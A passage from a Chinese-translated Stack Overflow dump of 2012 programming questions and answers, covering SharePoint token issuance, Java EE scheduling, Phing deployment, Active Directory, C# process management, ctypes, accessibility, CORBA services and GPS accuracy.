 at System.Web.HttpApplication.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()    
 at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) 
```

长话短说，我想要一种无需使用密码即可为我的会员创建令牌的方法。

有没有人有这方面的经验，或者知道我如何才能得到我想要的东西？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T07:10:50.263

如果其他人遇到同样的情况，我会说我是如何“解决”这个问题的。

在专业环境中，您很可能会创建自己的会员提供程序/安全令牌服务，这样您就可以在代码中请求令牌，而无需用户密码。

就我而言（由于时间限制）我做不到，所以我采取了更简单的方法。我没有使用*加密*密码（通过 IIS），而是使用了*散列*密码（在 web.config 中手动设置）。我还确保允许为我的会员提供商*重置密码*。然后我使用以下代码发出令牌：

```
MembershipUser user = membershipProvider.GetUser(username, true);
if(user == null)
{
    //create new user here
}
string password = user.ResetPassword();
SecurityToken token = SPSecurityContext.SecurityTokenForFormsAuthentication(new Uri(SPContext.Current.Web.Url), membershipProviderName, roleProviderName, user.UserName, password, false);
SPFederationAuthenticationModule.Current.SetPrincipalAndWriteSessionToken(token); 
```

实际上，这意味着表单用户每次登录时都会重置他的密码，但由于他从未真正*使用*过他的密码，所以问题不大。它可以很好地在 SharePoint 中快速显示 OpenID 支持。

# collaboration - 最好的免费协作工具现在 Google Wave 已不复存在？

> ID：10246603
> 
> 赞同：1
> 
> 时间：2012-04-20T12:51:30.160
> 
> 标签：collaboration, google-wave

随着 Google Wave 的不幸消亡，您用于辅助项目和非资助软件初创企业的最佳替代免费项目协作工具是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T22:30:53.253

注册 Runby，它将 Google Wave 方法（托管对话）与电子邮件集成：

[http://runby.me](http://runby.me)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T12:52:38.877

到目前为止，这是我的第一选择：

[http://www.teamlab.com/](http://www.teamlab.com/)

# jakarta-ee - 未调用 Java EE 调度程序

> ID：10246606
> 
> 赞同：10
> 
> 时间：2012-04-20T12:51:35.637
> 
> 标签：jakarta-ee, glassfish, scheduler

我在 Glassfish 中运行我的应用程序。我试图创建一个作业，它将每 5 分钟执行一次，如下所示：

```
@Startup
@Singleton
@LocalBean
public class TempFolderCleaner {
    private final static Logger LOGGER = LoggerFactory.getLogger(TempFolderCleaner.class);

    @EJB
    private ReportStatusDao reporStatusDao;

    @Schedule(minute = "*/5")
    public void removeOldReports() {
        LOGGER.debug("start removeOldReports()");
    }
} 
```

但是，它永远不会被调用。我试图从记录器中看到一条消息并设置一个调试点，但它不会被调用。我将此文档用于语法：http: [//download.oracle.com/javaee/6/tutorial/doc/bnboy.html](http://download.oracle.com/javaee/6/tutorial/doc/bnboy.html)

我也试图准确地指定分钟。不幸的是也没有成功。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-20T13:07:39.943

我认为“小时”默认为 0（午夜），因此您可能需要将其指定为：

```
@Schedule(minute = "*/5", hour="*") 
```

# git - Phing 和 github

> ID：10246607
> 
> 赞同：5
> 
> 时间：2012-04-20T12:51:43.947
> 
> 标签：git, github, phing

我正在尝试使用 phing 自动部署来自私有 github 存储库的代码，但在尝试找到类似于 SVN 导出的东西时遇到了麻烦。

我已经阅读了一些关于 git archive 和 git checkout-index 的帖子，但很难让这些与 github 一起工作。我的印象是他们热衷于我们使用 zip 下载，因为他们可以缓存这些等。

如果在 Phing 中有一个简单的任务来执行此操作，我不介意从 github 下载 zip，一个简单的 http 任务不起作用，因为它通过 https 并且我想首先需要某种身份验证。

我设法在 Phing 中使用了 gitclone 任务，但是“.git”隐藏文件夹也被克隆了，这引起了巨大的头痛......主要是因为在后续构建中我无法删除构建文件夹，因为它建议某些 git 文件，即 *. idx 或 *.pack 正在使用中。

有没有人对 phing 和私人 github 仓库有任何运气？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-03T14:32:38.740

@AYK 我的错，最近一直在探索部署选项，并认为会与 Capistrano 一起推出......

无论如何，这是我最终在人们的建议下临时使用的构建脚本......

*   假设我的应用程序位于“C:\app”
*   假设这个 build.xml 文件位于“C:\app”
*   假设我的应用程序还包含一个 git repo "C:\app.git"
*   删除之前构建中可能存在的任何构建和部署目录“C:\app\build”和“C:\app\deploy”
*   创建目录“C:\app\build”和“C:\app\deploy”，将保存 git checkout 和要部署的最终代码
*   按照建议执行 git checkout 从 git 签出代码并将其放入“C:\app\build”
*   有某些目录，例如我不想出去的文档，所以我将要部署的文件复制到“C:\app\deploy”

*   Phing 的问题是 scp 部分，需要 PHP 中的 ssh2 dll，我没有也不想花时间尝试为它编译源代码。

*   总而言之，我通过 Phing 实现了我最初想要的，但在与 Capistrano 度过了一个晚上后，我转变了

== build.xml ==

```
<?xml version="1.0" encoding="UTF-8"?>

<project description="" name="MyProject" default="build" basedir=".">

    <property file="build.properties" />
    <tstamp>
    <format property="build.time" pattern="%Y%m%d_%H%I" />
    </tstamp>

    <!-- ============================================  -->
    <!-- Target: prepare                                 -->
    <!-- ============================================  -->
    <target name="prepare">
    <echo msg="Deleting old build and deploy dirs" />
    <delete dir="./build/" includeemptydirs="true" failonerror="true" />
    <delete dir="./deploy/" includeemptydirs="true" failonerror="true" />
    </target>

    <!-- ============================================  -->
    <!-- Target: create                                -->
    <!-- ============================================  -->
    <target name="create" depends="prepare">
    <echo msg="Creating fresh build and deploy directories" />
    <mkdir dir="./build/" />
    <mkdir dir="./deploy/" />
    </target>

    <!-- ============================================  -->
    <!-- Target: gitclone                              -->
    <!-- ============================================  -->
    <target name="gitcheckout" depends="create">
    <echo msg="Checking out latest code" />
    <exec command="git checkout-index --prefix ./build/ -a"></exec>
    </target>

    <!-- ============================================  -->
    <!-- Target: preparedeploy                         -->
    <!-- ============================================  -->
    <target name="preparedeploy" depends="gitcheckout">
    <echo msg="Preparing deploy" />
    <copy todir="./deploy/" >
        <fileset dir=".">
        <include name="cgi-bin/**" />
        <include name="htdocs/**" />
        </fileset>
    </copy>
    <mkdir dir="./deploy/logs" />
    </target>

    <!-- ============================================  -->
    <!-- Target: cleanup                                 -->
    <!-- ============================================  -->
    <target name="cleanup" depends="preparedeploy">
    <echo msg="Deleting build dir" />
    <delete dir="./build/" includeemptydirs="true" failonerror="true" />
    </target>

    <!-- ============================================  -->
    <!-- Target: build                                 -->
    <!-- ============================================  -->
    <target name="build" depends="cleanup, preparedeploy, gitcheckout, create, prepare">
    <echo msg="Starting build ${build.time}" />
    </target>

</project> 
```

# c# - 如何使用 C# 在 Windows server 2003 Active Directory 中设置 TerminalServiceProfile 路径？

> ID：10246609
> 
> 赞同：0
> 
> 时间：2012-04-20T12:51:52.027
> 
> 标签：c#, active-directory

我知道在 Windows 2008 AD 中，我们有 msTsProfilePath AD 属性，使用它我们可以直接设置终端服务配置文件路径。

但是我们有 Windows 2003 AD，我需要使用 C# 设置终端服务配置文件路径。我遇到了以下文章，并从其他一些文章中了解到终端服务配置文件路径存储在 userParameters 属性中。

[http://www.selfadsi.org/user-attributes-w2k3.htm#List](http://www.selfadsi.org/user-attributes-w2k3.htm#List)

有人可以告诉我如何通过 C# 在 userParameters 中设置 CtxWFProfilePath 吗？

谢谢，
尼基尔。

**更新：**
请参考这个[MSDN 论坛](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/485df45c-de86-4084-8935-4179711bb7f9)，这位绅士“Konrad Neitzel”向我介绍了一些有用的链接。但正如线程中提到的，我发现使用 WTSSetUserConfig 方法有困难。任何想法 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-08T06:00:14.073

我也与这个进行了斗争，但最终能够从数十个不同的站点组合出一个可行的解决方案。我不确定这是否正是您所需要的，但希望对您有所帮助

```
PrincipalContext domainContext = new PrincipalContext(ContextType.Domain, "name", "container");
UserPrincipals user = UserPrincipals.FindByIdentity(domainContext, "ad_user_name");

DirectoryEntry dirEntry = (user.GetUnderlyingObject() as DirectoryEntry);
dirEntry.InvokeSet("TerminalServicesProfilePath", "yourpath");

dirEntry.CommitChanges(); 
```

你可以从这个站点找到所有属性（另一个很难找到） [http://www.virtualizationadmin.com/articles-tutorials/terminal-services/scripting/scripting-server-based-computing-terminal-services-attributes -active-directory-user-objects.html](http://www.virtualizationadmin.com/articles-tutorials/terminal-services/scripting/scripting-server-based-computing-terminal-services-attributes-active-directory-user-objects.html)

# java - Java删除和重命名文件问题

> ID：10246614
> 
> 赞同：2
> 
> 时间：2012-04-20T12:52:10.997
> 
> 标签：java

下面的方法具有简单地将文件从“工作”目录移动到它通过方法调用接收的路径的“移动”目录的功能。这一切都有效，但对于文件名具有两个扩展名（如 .xml.md5）的情况，其中 .renameTo 方法返回 false。有没有办法改变下面的代码，所以不管它运行在什么操作系统上，它都可以工作。（目前是Windows）

```
public void moveToDir(String workDir, String moveDir) throws Exception {
    File tempFile = new File(workDir);
    File[] filesInWorkingDir = tempFile.listFiles();
    for (File file : filesInWorkingDir) {
        System.out.println(file.getName());
        if (new File(moveDir + File.separator + file.getName()).exists()) 
            new File(moveDir + File.separator + file.getName()).delete();
        System.out.println(moveDir + File.separator + file.getName());
        Boolean renameSuccessful = file.renameTo(new File(moveDir + File.separator + file.getName()));
        if (!renameSuccessful) throw new Exception("Can't move file to " + moveDir +": " + file.getPath());
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:01:39.890

我已经简化了您的代码并添加了删除是否成功的检查。尝试一下。

```
public void moveToDir(String workDir, String moveDir) {
  for (File file : new File(workDir).listFiles()) {
      System.out.println(file.getName());
      final File toFile = new File(moveDir, file.getName());
      if (toFile.exists() && !toFile.delete())
        throw new RuntimeException("Cannot delete " + toFile);
      System.out.println(toFile);
      if (!file.renameTo(toFile))
        throw new RuntimeException(
          "Can't move file to " + moveDir +": " + file.getPath());
  }
} 
```

# version-control - TeamCity 可以从网络连接的服务器获取源代码吗？

> ID：10246616
> 
> 赞同：2
> 
> 时间：2012-04-20T12:52:11.980
> 
> 标签：version-control, continuous-integration, teamcity

我将所有源代码保存在位于网络附加服务器上的存储库中。我刚刚开始与 TeamCity 进行持续集成，我希望它能够从 NAS 中获取代码。当我尝试设置 VSC 连接时，它会失败并警告 TeamCity 无法访问映射的网络驱动器。有什么简单的方法可以解决这个问题吗？大多数人是怎么做到的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T21:50:13.017

让 TeamCity 从存储库中检查您的代码，而不是网络驱动器，通常通过 http。与开发人员使用存储库时的方式几乎相同。

[http://confluence.jetbrains.net/display/TCD7/Configuring+VCS+Settings](http://confluence.jetbrains.net/display/TCD7/Configuring+VCS+Settings)

# google-app-engine - 我的 GAE python 开发数据存储永远不会保存到文件中

> ID：10246626
> 
> 赞同：0
> 
> 时间：2012-04-20T12:52:52.983
> 
> 标签：google-app-engine, google-cloud-datastore, python-2.7, eclipse-indigo

我刚刚开始使用 GAE (Python 2.7 SDK 1.6.4)，我已经在 Windows XP (SP3) 上的 eclipse (indigo) 中使用 Pydev (最新版本) 建立了一个简单的测试项目。

一切正常，我的应用程序可以在数据存储和 blobstore 中记录数据，然后检索它，但是当我停止开发服务器并重新启动它时，数据存储中的数据会丢失。这不是 blobstore 的情况，它可以很好地保留 blob，我可以看到在 C:\Temp 中创建的 blobstore 文件夹

我做了明智的事情并翻阅旧帖子，发现大多数遇到此问题的人都是通过更改数据存储文件的位置来解决的，因此我使用了以下参数；

```
--datastore_path="${workspace_loc}/myproject/datastore" 
--blobstore_path="${workspace_loc}/myproject/blobstore" 
"${workspace_loc}/myproject/src" 
```

如您所见，我同时移动了 blobstore。

blobstore 仍然有效，现在 blobstore 文件夹已按预期在 myproject 文件夹中创建。但是，仍然没有创建数据存储文件，当我停止并重新启动开发服务器时，数据仍然丢失。

开发服务器启动日志包括以下条目

```
WARNING  2012-04-20 10:49:04,513 datastore_file_stub.py:513] Could not 
read datastore data from C:\myworkspace\myproject\datastore 
```

所以我知道它正在尝试在正确的位置创建数据存储。

最后，我解除了整个 Eclipse 工作区文件夹并将其复制到另一台具有完全相同设置的计算机上，只是它运行的是 Windows 7 而不是 Windows XP。

那里一切正常 - 数据存储文件和 blobstore 文件夹现在都在我期望的位置创建。

我已经在两台计算机上以完全相同的方式设置了 eclipse、python、gae、我的项目和我的 eclipse 启动文件，它在一台计算机上运行，​​而在另一台计算机上运行。也许 XP 与它有关，但老实说，我认为这不太可能。

我想出的唯一其他线索是，最近对 GAE 开发服务器的更改在每次更改后停止写入数据存储文件，并且仅在退出时刷新，这个问题可能与我的密切相关；

[App Engine 本地数据存储区内容不持久](https://stackoverflow.com/questions/10047315/app-engine-local-datastore-content-does-not-persist)

但是，将以下内容添加到我的代码中根本没有帮助。

```
from google.appengine.tools import dev_appserver 
import atexit 
atexit.register(dev_appserver.TearDownStubs) 
```

因此，据我所知，这并不是因为终止序列不正确，尽管可能是我只是将它添加到了错误的位置（我是 python 新手）。

无论如何，我很难过，我会非常感谢你们能提出的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:23:12.117

它可能是[http://code.google.com/p/googleappengine/issues/detail?id=7244](http://code.google.com/p/googleappengine/issues/detail?id=7244)和一个错误。希望很快会有一个修复程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-18T16:59:11.393

你试过了吗：

--storage_path=...

将存储所有本地文件（例如 Datastore、Blobstore 文件、Google Cloud Storage 文件、日志等）的路径，除非被 --datastore_path、--blobstore_path、--logs_path 等覆盖。

在[https://developers.google.com/appengine/docs/python/tools/devserver?csw=1找到](https://developers.google.com/appengine/docs/python/tools/devserver?csw=1)

# c# - 关闭通过线程启动的进程

> ID：10246633
> 
> 赞同：0
> 
> 时间：2012-04-20T12:53:36.697
> 
> 标签：c#, multithreading, system.diagnostics

我目前正在处理 ac# 项目，并且正在使用 System.Diagnostic.Process 类。

当我的程序启动时，它会创建一个新线程，并在每个线程中启动一个不同的进程。

在某些时候，我需要检查程序中的设置，以查看每个进程是否应该继续运行或是否应该停止，但我不知道如何引用由某个线程启动的进程。每个线程我在进程启动时都给了一个名字，但我的理解是 c# 创建线程，启动进程然后关闭线程，即使进程仍在运行并且仍在接收输出。

有没有办法可以找出哪个进程由哪个线程启动并取消该进程的运行。

但是我看不到如何使用此方法和字典来停止基于此线程名称的进程。

**更新** 下面的请求是我正在使用的代码，它在线程中创建每个进程。我在字典中使用该线程，以便可以从 outputreceived 事件中引用它，但如果我需要关闭该进程，我不确定该怎么做。

```
Thread worker = new Thread(new ThreadStart(() => startProducts(product.Value[0].startScript, product.Value[0].productName)));
                worker.IsBackground = false;
                worker.Name = product.Value[0].productName;
                worker.Start();
                logging.logger(string.Format("Starting product '{0}'", product.Value[0].productName)); 
```

线程调用的方法如下，这是每个进程启动的地方。每个进程都保证有一个不同的命名线程，永远不会有两个同名的线程。

```
private void startProducts(string startScript, string product)
        {
            Process startProductProcess = new Process();
            startProductProcess.StartInfo.FileName = startScript;
            if ( configManagement.productConfig[product][0].requireArguments == true )
            {
                startProductProcess.StartInfo.Arguments = configManagement.productConfig[product][0].arguments;
            }
            startProductProcess.StartInfo.UseShellExecute = false;
            startProductProcess.StartInfo.RedirectStandardOutput = true;
            StringBuilder processOutput = new StringBuilder("");
            startProductProcess.OutputDataReceived += new DataReceivedEventHandler(startProductProcess_OutputDataReceived);
            startProductProcess.Exited += new EventHandler(startProductProcess_Exited);
            processTag.Add(startProductProcess, product);
            startProductProcess.Start();
            //Process localByName = Process.GetProcessById(startProductProcess.Id);
            startProductProcess.BeginOutputReadLine();
            logging.logger(string.Format("Started {0} with: {1} {2}", product, 
                startProductProcess.StartInfo.FileName, startProductProcess.StartInfo.Arguments));
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T16:34:16.677

除非您有通过使用单独的线程创建每个进程来解决的特定需求，否则不要使用线程。如果您正在寻找的只是在代码中识别给定进程的唯一方法，则可以使用您*为*线程提供的名称作为字典中的标识符。

```
Dictionary<string, Process> processesByName = new Dictionary<string, Process>();
Process firstProcess = ... //Start your process
Process secondProcess = ... //Start your process
processesByName.Add("FirstProcessName", firstProcess);
processesByName.Add("SecondProcessName", secondProcess); 
```

之后，您可以按您指定的名称提取给定进程，并根据需要与它进行交互。

```
Process process = processesByName["FirstProcessName"];
if (!process.HasExited)
{
    process.CloseMainWindow();
    process.Close();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:56:36.400

为什么要使用线程名称？如果您要将此活动集中起来，您将不知道哪个线程将运行任何特定进程。

如果您正在管理进程，请定义一个“managedProcess”类，该类可以包含进程名称、进程 EXE 路径、进程句柄、在句柄上等待进程完成的线程、任何状态枚举、要保留的任何互斥锁的字段和属性字段线程安全，启动和停止它的方法 - 与进程有关的任何事情。将此 managedProcess 类的实例推送到您的容器中。

恕我直言，忘记除调试以外的任何线程名称。

终止 - 在您的 stop() 方法中，您可以尝试发布 WM_CLOSE，（您可以直接执行此操作，还是 P/Invoke？），等待几秒钟以查看线程等待是否发出进程已关闭的信号并且，如果没有，请调用 TerminateProcess()，（或任何用于 TerminateProcess 的托管事物）。

# python - Python ctypes访问冲突

> ID：10246639
> 
> 赞同：0
> 
> 时间：2012-04-20T12:53:45.900
> 
> 标签：python, ctypes

我正在尝试按照[本指南](https://stackoverflow.com/questions/252417/how-can-i-use-a-dll-from-python)从 python 访问 dll 。我尝试从 dll 调用的第一个函数似乎工作正常，所以我必须大部分都在那里，但第二个函数给了我访问冲突。

Python代码：

```
#create open function
openProto = ctypes.WINFUNCTYPE( ctypes.c_int, ctypes.c_void_p )
openParams = ( 1, "handle", 0 ) ,
open = openProto ( ( "SensorOpen", pm ), openParams )

#create zero function
zeroProto = ctypes.WINFUNCTYPE( ctypes.c_int, ctypes.c_int )
zeroParams = ( 1, "handle", 0 ), 
zero = zeroProto ( ( "SensorZero", pm ), zeroParams )

handle = ctypes.c_int ( 0 )
status = ctypes.c_int ( 0 )
open( ctypes.byref(handle) )
print handle
zero( handle ) 
```

当我调用零（句柄）时发生访问冲突。

执行此操作的 C++ 代码在这里：

```
SENSOR_HANDLE   seHandle;  // Sensor handle
double          power;
char            buff[80];

// Get handle for sensor
SensorOpen (&seHandle);

printf ("Sensor connected\nZeroing, please wait...\n");
while (SensorZero (seHandle) == SENSOR_ZERO_FAILED)
{
    printf ("Zero failed.\nCheck no power is being applied.\nPress return key to retry  ");
    gets (buff);
} 
```

SENSOR_HANDLE 只是一个`typedef`'d`int`

有任何想法吗？我认为不对返回的值做任何事情是可以的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:03:11.403

问题解决了。

c++ 代码是一些文档提供的示例代码。不用说示例代码和文档是不正确的（零函数仍然希望它的参数作为指针）。

# javascript - 屏幕阅读器和 JavaScript 打印功能

> ID：10246641
> 
> 赞同：3
> 
> 时间：2012-04-20T12:53:55.550
> 
> 标签：javascript, accessibility, screen-readers

我为网页编写了一个基于 JavaScript 的打印功能。它从页面上的隐藏 div 中提取 HTML，将其呈现到新窗口中并触发打印对话框。

该选项通过`button`事件`onclick="printTheThing()"`提供。我知道例如屏幕阅读器对 JavaScript 有一些警告。**我想知道我是否/有多少人（例如盲人或视力障碍者）无法使用此功能。**

该实现会打开一个新的浏览器窗口并附加到其文档中：

```
function printTheThing() {
    var dispSettings = "toolbar=yes,location=no,directories=yes,menubar=yes,"
        + "scrollbars=yes,width=550,height=400",
        html = $('#theDivToPrint').html(),
        printWindow = window.open("", "", dispSettings),
        doc = printWindow.document;

    doc.open();
    try {
        doc.write('<html><head>');
        doc.write('<title>' + title + '</title>');
        doc.write('</head><body>');
        doc.write(html);
        doc.write('</body></html>');
    } finally {
        doc.close();
    }
    printWindow.focus();
    printWindow.print();
} 
```

更新：这是按钮的样子：

```
<button type="button" onclick="printTheThing()">Print the thing!</button> 
```

另外，我正在使用 CSS 将按钮替换为图像。我已经使用 Firefox 插件“Fangs”测试了该按钮。它表明屏幕阅读器将完美地读出原始按钮文本。但是 Fangs 不提供任何交互性，所以我无法用它测试打印。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:18:49.887

根本不应该依赖 Chrome 扩展程序。您应该使用免费的 NVDA 进行测试。我猜谷歌粉丝会说 Chrome Vox 很好。相信我，我已经在 AT 工作了将近 15 年。

无论如何，我需要查看按钮的代码，而不是 JS……JS 看起来不错。有些人不知道有一个新窗口，但是打印对话框应该抓住焦点而不是窗口

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:04:58.453

最好的方法肯定是自己尝试一下。

有一个谷歌浏览器扩展允许你这样做：[https ://chrome.google.com/webstore/detail/kgejglhpjiefppelpmljglcjbhoiplfn](https://chrome.google.com/webstore/detail/kgejglhpjiefppelpmljglcjbhoiplfn)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:17:29.690

要通过使用屏幕阅读器来提高可访问性，请使用 W3C WAI-ARIA 实时区域，有关更多信息，请参阅[他们的建议](http://www.w3.org/WAI/PF/aria-practices/)和[常见问题解答](http://www.w3.org/WAI/aria/faq)。

要进行测试，您可以使用以下屏幕阅读器：
在 Windows 上 - JAWS，
Linux 上的 NVDA - orca（不使用 Chromium）+ Florian Margaine 的建议

您还可以使用[AChecker](http://achecker.ca/checker/index.php)测试 WCAG 2.0 第 508 节 Stanca Act 可访问性标准的合规性。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T14:21:34.223

呈现可打印页面的方法是使用`@media`CSS 指令。这样你就不需要做任何特别的事情，比如弹出另一个窗口或担心可访问性：内容只是正确打印（如果你想要的话，可能与屏幕布局有很大不同）。

# c# - 添加项目作为对另一个项目的引用

> ID：10246642
> 
> 赞同：1
> 
> 时间：2012-04-20T12:53:56.913
> 
> 标签：c#, asp.net-mvc-2

我在同一个解决方案中有两个项目。一个是 ASP.NET MVC 2 空 Web 应用程序，另一个是控制台应用程序。

在第一个项目中，我使用 EF 和一个访问数据库的类创建了一个数据库。我想要做的是添加第一个项目作为对控制台应用程序项目的引用，这样我就可以使用这个类

我已经将它作为参考包含在参考中，然后在我的控制台应用程序顶部包含一个 using 指令，我什至可以使用代码帮助。但是当我编译时，我总是得到错误：

找不到类型或命名空间名称“DBModel”（您是否缺少 using 指令或程序集引用？）

我如何编译我的项目？

真挚地，

佐利

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:02:47.807

根据你的描述，如果我没看错的话，

通常是这种情况`when you have different target .NET framework`（项目属性、应用程序、目标框架）——例如，一个是 .NET 4.0 客户端配置文件——而你引用的库只是 .NET 4.0。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:04:18.677

您也可能在控制台应用程序中缺少对实体框架的引用。

有关更多信息，请参阅此帖子：http: [//www.dotnetcurry.com/ShowArticle.aspx?](http://www.dotnetcurry.com/ShowArticle.aspx?ID=617) ID=617 （就在中间下方，第 3 步）。

# java - 将 CORBA orbd-Name 服务安装为 Windows 服务

> ID：10246643
> 
> 赞同：2
> 
> 时间：2012-04-20T12:53:57.487
> 
> 标签：java, service, windows-services, naming, corba

我使用 Java SE 平台的 Java IDL 组件开发了 CORBA 服务器/客户端。

我想在 Windows 平台上将此应用程序作为服务启动，所以我使用[Java Service wrapper](http://wrapper.tanukisoftware.com/doc/english/download.jsp)并将应用程序安装为服务。

但在启动服务器之前，我需要启动*orbd.exe* - Oracle 的 CORBA 命名服务。

我尝试使用`sc create`来自 Windows 的命令将此 exe 安装为服务。

但是当我使用`sc start`

它挂起并引发以下错误：

```
 [SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion. 
```

这个windows服务有什么问题？

如何将 CORBA 命名服务作为 windows 服务启动？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T15:02:36.907

您收到错误 1053，因为 orbd.exe 不是本机 Windows 服务，无法正确响应启动自身的请求。您将需要一个“服务包装”应用程序，它可以接受 Windows 服务命令（启动、停止）并对可执行文件采取适当的操作（启动、终止）。

[如果您的需求是基本的， Microsoft 的免费 SRVANY 实用程序](http://www.coretechnologies.com/WindowsServices/FAQ.html#WhatIsSrvany)就足够了，但也有一些更强大的商业替代方案可用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T03:57:24.397

您实际上也可以使用 Wrapper 运行 orbd。

基本上，您的 orbd.conf 文件中需要以下属性：

```
wrapper.java.command=%JAVA_HOME%/bin/java

wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleApp
wrapper.app.parameter.1=com.sun.corba.se.impl.activation.ORBD

wrapper.java.additional.1=-Dapplication.home="%JAVA_HOME%"
wrapper.java.additional.2=-Dcom.sun.CORBA.activation.DbDir="%JAVA_HOME%"/orb.db
wrapper.java.additional.3=-Dcom.sun.CORBA.activation.Port=1049
wrapper.java.additional.4=-Dcom.sun.CORBA.POA.ORBServerId=1

wrapper.java.classpath.1=%JAVA_HOME%\lib\tools.jar
wrapper.java.classpath.2=%JAVA_HOME%\classes
wrapper.java.classpath.3=../lib/wrapper.jar

wrapper.java.library.path.1=../lib
wrapper.java.library.path.2=%JAVA_HOME%/bin

wrapper.name=orbd
wrapper.displayname=CORBA Naming Service 
```

一旦它被安装为服务，您可以为您的应用程序设置对该服务的依赖关系，以确保在您运行应用程序时启动 orbd。

```
wrapper.ntservice.dependency.1=orbd 
```

（您需要重新安装应用程序才能设置依赖项）

希望这可以帮助你。

干杯

# emacs - 组织模式乳胶导出中的多个作者

> ID：10246647
> 
> 赞同：8
> 
> 时间：2012-04-20T12:54:06.300
> 
> 标签：emacs, latex, org-mode

我在 Emacs 的 org 模式下写了很多文件，这很棒。我开始在 org-mode 下撰写科学论文。但是：这篇文章有几个作者。

我用了

```
#+AUTHOR: Author 1, Author 2 
```

它正确导出到 Latex。

但是，我需要作者的电子邮件和机构。我可以直接在 org-mode 下做吗？

命令

```
#+EMAIL: email1, email2 
```

选择最后一个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-29T00:36:06.560

```
#+EMAIL: email@foo.uk, email@bar.uk 
```

在这里正常工作（组织 7.8.09）。

# asp.net - 在 ASP.NET 中与多个 Web 服务调用一起使用的模式

> ID：10246659
> 
> 赞同：1
> 
> 时间：2012-04-20T12:54:53.840
> 
> 标签：asp.net

这是一个一般的架构问题。我有一个 .aspx 页面，其中包含大约 10 个用户控件，每个控件都发出 Web 服务调用以呈现其内容。目前网络调用是同步进行的，所以整体页面渲染时间很慢（>2 秒）。

我正在考虑使用异步调用来呈现控件，以减少页面加载时间。您能否指出一些有关如何做到这一点的资源，最好是使用较新的 TPL 库？（我还不想使用 Async CTP）。我知道如何使用任务库来创建异步调用，我只是不确定整个场景如何在具有多个用户控件的情况下工作，每个控件都需要异步 Web 服务加载，但所有用户控件任务都应该在页面呈现之前完成。

我希望我足够清楚。

谢谢 Themos

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:04:23.597

您可能需要来自每个控件的异步调用，但也有可能使整个页面加载异步：

[http://msdn.microsoft.com/en-us/magazine/cc163725.aspx](http://msdn.microsoft.com/en-us/magazine/cc163725.aspx)

使页面异步不会使您的服务调用并行发生，这可能是您所需要的。为此，您需要在每个控件中进行异步调用。

希望它有一些用处。

# blackberry - 如何检测任何黑莓应用程序是否支持屏幕密度？

> ID：10246660
> 
> 赞同：0
> 
> 时间：2012-04-20T12:54:56.100
> 
> 标签：blackberry, bold

我想开发一个应用程序，我将安装在我的 Bold 设备上。现在我的应用程序是否可以检索有关安装在我的设备上的应用程序的信息，这些应用程序可以安装在其他设备上，如 Torch/Storm/Tablet 手机黑莓。是否可以？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T18:51:14.543

甚至具有比 Web-SDK 功能更丰富的 Java API 也不提供有关已安装应用程序的此类信息。要检查已安装应用程序的所有可能操作，请查看RIM API SDK 中`CodeModuleManager`的`ApplicationManager`类。

# iphone - 如何评估 GPS 信号强度？（苹果手机）

> ID：10246662
> 
> 赞同：8
> 
> 时间：2012-04-20T12:54:57.423
> 
> 标签：iphone, ios, gps, cllocation

我需要一种对 GPS 信号强度进行分类的方法。到目前为止，我遇到了（[类引用](http://developer.apple.com/library/ios/#documentation/CoreLocation/Reference/CLLocation_Class/CLLocation/CLLocation.html)）的`horizontalAccuracy`属性。`CLLocation`

更具体地说，我需要创建如下内容；我遇到的问题是填写`if`报表。

```
if (someLocation.horizontalAccuracy ...)
{
    // No Signal
}
else if (someLocation.horizontalAccuracy ...)
{
    // Poor Signal
}
else if (someLocation.horizontalAccuracy ...)
{
    // Average Signal
}
else if (someLocation.horizontalAccuracy ...)
{
    // Good Signal
}
else
{
    // Excellent Signal
} 
```

请问有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T13:06:18.697

我过去使用过这样的数字：

```
if (someLocation.horizontalAccuracy < 0)
{
    // No Signal
}
else if (someLocation.horizontalAccuracy > 163)
{
    // Poor Signal
}
else if (someLocation.horizontalAccuracy > 48)
{
    // Average Signal
}
else
{
    // Full Signal
} 
```

但老实说，它对用户来说并不是很好。它会显示为低准确度，但是当他们查看地图应用程序时，它几乎可以完美地定位它们（​​尽管它们周围有一个圆圈）。

与其尝试定义准确度级别，而且如果您的应用程序是基于地图的，您是否可以像 Maps 一样将水平准确度显示为圆形叠加层？然后用户可以自己决定它是否足够准确。

# c# - 当我读取 xml 文件时，它会读取元素的重复项

> ID：10246666
> 
> 赞同：1
> 
> 时间：2012-04-20T12:55:07.770
> 
> 标签：c#, winforms

